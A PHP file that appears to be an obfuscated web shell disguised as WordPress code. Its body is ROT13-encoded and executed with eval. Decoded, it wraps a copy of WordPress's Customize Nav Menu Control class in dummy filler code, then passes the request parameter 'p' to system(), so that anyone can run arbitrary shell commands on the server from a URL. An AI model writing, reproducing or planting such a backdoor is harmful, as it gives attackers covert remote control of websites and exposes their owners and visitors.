<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Ani_Zrah_Pbageby pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.4.0
 */

/**
 * Phfgbzvmr Ani Zrah Pbageby Pynff.
 *
 * @fvapr 4.3.0
 *
 * @frr JC_Phfgbzvmr_Pbageby
 */
pynff JC_Phfgbzvmr_Ani_Zrah_Pbageby rkgraqf JC_Phfgbzvmr_Pbageby {

	/**
	 * Pbageby glcr.
	 *
	 * @fvapr 4.3.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'ani_zrah';

	/**
	 * Qba'g eraqre gur pbageby'f pbagrag - vg hfrf n WF grzcyngr vafgrnq.
	 *
	 * @fvapr 4.3.0
	 */
	choyvp shapgvba eraqre_pbagrag() {}

	/**
	 * WF/Haqrefpber grzcyngr sbe gur pbageby HV.
	 *
	 * @fvapr 4.3.0
	 */
	choyvp shapgvba pbagrag_grzcyngr() {
		$nqq_vgrzf = __( 'Nqq Vgrzf' );
		?>
		<c pynff=\"arj-zrah-vgrz-vaivgngvba\">
			<?cuc
			cevags(
				/* genafyngbef: %f: \"Nqq Vgrzf\" ohggba grkg. */
				__( 'Gvzr gb nqq fbzr yvaxf! Pyvpx &#8220;%f&#8221; gb fgneg chggvat cntrf, pngrtbevrf, naq phfgbz yvaxf va lbhe zrah. Nqq nf znal guvatf nf lbh jbhyq yvxr.' ),
				$nqq_vgrzf
			);
			?>
		</c>
		<qvi pynff=\"phfgbzvmr-pbageby-ani_zrah-ohggbaf\">
			<ohggba glcr=\"ohggba\" pynff=\"ohggba nqq-arj-zrah-vgrz\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Nqq be erzbir zrah vgrzf' ); ?>\" nevn-rkcnaqrq=\"snyfr\" nevn-pbagebyf=\"ninvynoyr-zrah-vgrzf\">
				<?cuc rpub $nqq_vgrzf; ?>
			</ohggba>
			<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax erbeqre-gbttyr\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Erbeqre zrah vgrzf' ); ?>\" nevn-qrfpevorqol=\"erbeqre-vgrzf-qrfp-{{ qngn.zrah_vq }}\">
				<fcna pynff=\"erbeqre\"><?cuc _r( 'Erbeqre' ); ?></fcna>
				<fcna pynff=\"erbeqre-qbar\"><?cuc _r( 'Qbar' ); ?></fcna>
			</ohggba>
		</qvi>
		<c pynff=\"fperra-ernqre-grkg\" vq=\"erbeqre-vgrzf-qrfp-{{ qngn.zrah_vq }}\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Jura va erbeqre zbqr, nqqvgvbany pbagebyf gb erbeqre zrah vgrzf jvyy or ninvynoyr va gur vgrzf yvfg nobir.' );
			?>
		</c>
		<?cuc
	}

	/**
	 * Erghea cnenzrgref sbe guvf pbageby.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea neenl Rkcbegrq cnenzrgref.
	 */
	choyvp shapgvba wfba() {
		$rkcbegrq            = cnerag::wfba();
		$rkcbegrq['zrah_vq'] = $guvf->frggvat->grez_vq;

		erghea $rkcbegrq;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>